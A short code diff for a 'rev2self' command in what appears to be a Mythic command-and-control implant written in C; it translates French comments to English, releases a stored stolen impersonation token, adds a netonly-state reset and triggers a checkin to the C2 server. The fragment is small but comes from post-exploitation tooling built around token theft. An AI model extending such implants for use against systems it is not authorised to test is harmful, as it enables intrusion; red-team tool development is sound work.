@@ -11,15 +11,16 @@
 void command_rev2self(char *task_id, char *params) {
   (void)params;
 
-  /* Libérer le token d'impersonation stocké */
+  /* Free the stored impersonation token */
   if (g_stolen_token != NULL) {
     CloseHandle(g_stolen_token);
     g_stolen_token = NULL;
   }
+  clear_netonly_state();
 
   RevertToSelf();
 
-  // Déclenchement immédiat du checkin pour mettre à jour l'UI Mythic
+  // Trigger immediate checkin to update Mythic UI
   char display_user[512] = {0};
   get_current_display_user(display_user, sizeof(display_user));
   CheckinSend(display_user);
